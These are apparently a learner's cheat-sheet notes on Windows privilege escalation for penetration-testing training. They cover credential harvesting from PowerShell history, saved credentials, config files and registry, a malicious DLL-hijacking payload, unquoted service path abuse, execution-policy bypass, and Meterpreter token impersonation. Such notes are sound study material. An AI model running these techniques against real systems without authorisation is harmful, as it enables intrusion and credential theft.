# Privesc 
Useful Info Commands
--------------------

The following commands will help us enumerate users and their privileges on the target system.

Current user’s privileges: `whoami /priv`

List users: `net users`

List details of a user: `net user username` (e.g.`net user Administrator`)

Other users logged in simultaneously: `qwinsta` (the`query session` command can be used the same way) 

User groups defined on the system: `net localgroup`

List members of a specific group: `net localgroup groupname` (e.g.`net localgroup Administrators`

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`  
The `findstr` command can be used to find such files in a format similar to the one given below:

`findstr /si password *.txt`

`wmic qfe get Caption,Description,HotFixID,InstalledOn`

change persmissions with icacls: `icacls WService.exe /grant Everyone:F`

[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) for privilege escalation with windows privileges.

To change to a standard user while being admin, we can use token impersonation, just get a meterpreter shell and `load incognito`, `list_tokens -u` and the use `Impersonate_token "win/Admin"` to get a shell as that user.

```text-plain
takeown /f C:\Windows\System32\Utilman.exe
```

Unattended Windows Installations
--------------------------------

*   C:\\Unattend.xml
*   C:\\Windows\\Panther\\Unattend.xml
*   C:\\Windows\\Panther\\Unattend\\Unattend.xml
*   C:\\Windows\\system32\\sysprep.inf
*   C:\\Windows\\system32\\sysprep\\sysprep.xml

Powershell History
------------------

```text-plain
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```text-plain
cmdkey /list
runas /savecred /user:admin cmd.exe
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s
```

WMIC
----

WMIC is a command-line tool on Windows that provides an interface for Windows Management Instrumentation (WMI). WMIC can provide more information than just installed patches. For example, it can be used to look for unquoted service path vulnerabilities we will see in later tasks. For newer Windows(21H1 and above) versions you will need to use the WMI PowerShell cmdlet.

Scheduled Tasks
---------------

The `schtasks`  command can be used to query scheduled tasks.

`schtasks /query /fo LIST /v`

The `driverquery`  command will list drivers installed on the target system.

The query below will search for a service named “windefend” and return its current state.

`sc query windefend`

While the second approach will allow you to detect antivirus software without prior knowledge about its service name, the output may be overwhelming.

`sc queryex type=service`

Enabling script execution
-------------------------

To run PowerUp on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can launch PowerShell using the command below.

```text-plain
powershell.exe -nop -exec bypass
wmic product get name,version,vendor
wmic service list brief | findstr  "Running"
```

DLL Hijacking           
------------------------

```text-plain
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

compile with `x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`

If a service uses/requests a dll which is writeable/removable, we can replace that with our own malicious dll so when service is restarted with admin privilieges we can execute our command as System/Administrator

**Unquoted Service Path:**
--------------------------

when the service is launched, Windows follows a search order similar to what we have seen in the previous task. Imagine now we have a service (e.g. srvc) which has a binary path set to `C:\Program Files\topservice folder\subservice subfolder\srvc.exe`

[https://github.com/mattymcfatty/unquotedPoC](https://github.com/mattymcfatty/unquotedPoC) 

To search for unquoted service paths, we can use the following:

```text-plain
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

To the human eye, this path would be merely different than `C:\Program Files\topservice folder\subservice subfolder\srvc.exe`. We would understand the service is trying to run srvc.exe.

Windows approaches the matter slightly differently. It knows the service is looking for an executable file, and it will start looking for it. If the path is written between quotes, Windows will directly go to the correct location and launch service.exe. 

However, if the path is not written between quotes and if any folder name in the path has a space in its name, things may get complicated. Windows will append `.exe` and start looking for an executable, starting with the shortest possible path. In our example, this would be `C:\Program.exe`. If `program.exe` is not available, the second attempt will be to run `topservice.exe` under `C:\Program Files\`. If this also fails, another attempt will be made for `C:\Program Files\topservice folder\subservice.exe`. This process repeats until the executable is found. 

Knowing this, if we can place an executable in a location we know the service is looking for one, it may be run by the service. 

Token Impersonation:
--------------------

Service accounts, briefly mentioned in the introduction task, may have a higher privilege level than the low-level user you may have. In Windows versions before Server 2019 and 10 (version 1809), these service accounts are affected by an internal man-in-the-middle vulnerability. As you may know, man-in-the-middle (MitM) attacks are conducted by intercepting network traffic. In a similar fashion, higher privileged service accounts will be forced to authenticate to a local port we listen on. Once the service account attempts to authenticate, this request is modified to negotiate a security token for the "NT AUTHORITY\\SYSTEM" account. The security token obtained can be used by the user we have in a process called "impersonation". Although it has led to several exploits, the impersonation rights were not a vulnerability.   
  
In Windows versions after Server 2019 and Windows 10 (version 1809), impersonation rights were restricted. You can see below that a regular user does not have the "SeImpersonatePrivilege" privilege.

use sweet Potato 

Always Install Elevated:
------------------------

This method requires two registry values to be set. You can query these from the command line using the commands below. 

  
`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`  
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`  
  
Remember, to be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible.       

Token Impersonation:
--------------------

Enter: _load incognito_ to load the incognito module in metasploit.

To check which tokens are available, enter the _list\_tokens -g_.

Use the _impersonate\_token "BUILTIN\\Administrators"_ command to impersonate the Administrators token.

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the _ps_ command to view processes and find the PID of the services.exe process. Migrate to this process using the command _migrate PID-OF-PROCESS_